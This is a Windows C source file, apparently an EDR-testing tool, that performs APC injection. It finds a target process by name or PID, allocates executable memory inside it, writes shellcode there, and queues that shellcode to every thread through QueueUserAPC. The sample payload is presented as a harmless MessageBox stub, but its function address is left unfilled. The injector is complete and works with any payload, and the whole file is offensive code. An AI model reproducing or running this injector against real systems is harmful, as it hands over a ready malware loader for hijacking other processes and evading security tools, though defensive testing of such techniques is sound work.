/*
 * APC (Asynchronous Procedure Call) Injection
 * 
 * This technique injects shellcode using APC queue:
 * 1. Open target process
 * 2. Enumerate threads
 * 3. Allocate memory for shellcode
 * 4. Write shellcode to allocated memory
 * 5. Queue APC to thread(s)
 * 
 * For EDR testing purposes only.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Sample shellcode (MessageBox "Hello from APC!")
// This is a harmless example for testing
unsigned char shellcode[] = 
    "\x48\x83\xEC\x28"                          // sub rsp, 0x28
    "\x48\x31\xC9"                              // xor rcx, rcx
    "\x48\x8D\x15\x0C\x00\x00\x00"              // lea rdx, [rip+12]
    "\x4D\x31\xC0"                              // xor r8, r8
    "\x4D\x31\xC9"                              // xor r9, r9
    "\xFF\x15\x12\x00\x00\x00"                  // call qword ptr [rip+18]
    "\x48\x83\xC4\x28"                          // add rsp, 0x28
    "\xC3"                                      // ret
    "APC Injection Test\0"
    "\x00\x00\x00\x00\x00\x00\x00\x00";         // MessageBoxA address placeholder

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

BOOL InjectAPC(DWORD pid) {
    printf("[*] APC Injection Technique\n");
    printf("[*] Target PID: %d\n", pid);
    
    // Step 1: Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) {
        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Process handle obtained\n");
    
    // Step 2: Allocate memory for shellcode
    LPVOID pRemoteShellcode = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pRemoteShellcode == NULL) {
        printf("[!] Error: Failed to allocate memory. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Memory allocated at: 0x%p\n", pRemoteShellcode);
    
    // Step 3: Write shellcode to allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("[!] Error: Failed to write shellcode. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Shellcode written (%zu bytes)\n", bytesWritten);
    
    // Step 4: Enumerate threads in target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Error: Failed to create thread snapshot\n");
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    int apcQueued = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                // Open thread handle
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT,
                    FALSE,
                    te32.th32ThreadID
                );
                
                if (hThread != NULL) {
                    // Queue APC to thread
                    if (QueueUserAPC(
                        (PAPCFUNC)pRemoteShellcode,
                        hThread,
                        0
                    )) {
                        printf("[+] APC queued to thread ID: %d\n", te32.th32ThreadID);
                        apcQueued++;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    
    if (apcQueued > 0) {
        printf("[+] Successfully queued APCs to %d thread(s)\n", apcQueued);
        printf("[*] Note: APC will execute when thread enters alertable state\n");
        return TRUE;
    } else {
        printf("[!] Failed to queue any APCs\n");
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <process_name_or_pid>\n", argv[0]);
        printf("Example: %s notepad.exe\n", argv[0]);
        printf("Example: %s 1234\n", argv[0]);
        return 1;
    }
    
    DWORD pid;
    
    // Check if argument is numeric (PID) or process name
    if (atoi(argv[1]) != 0 || strcmp(argv[1], "0") == 0) {
        pid = atoi(argv[1]);
    } else {
        pid = GetProcessIdByName(argv[1]);
        if (pid == 0) {
            printf("[!] Error: Process '%s' not found\n", argv[1]);
            return 1;
        }
        printf("[+] Found process with PID: %d\n", pid);
    }
    
    if (!InjectAPC(pid)) {
        printf("[!] APC injection failed\n");
        return 1;
    }
    
    printf("[+] APC injection completed\n");
    return 0;
}
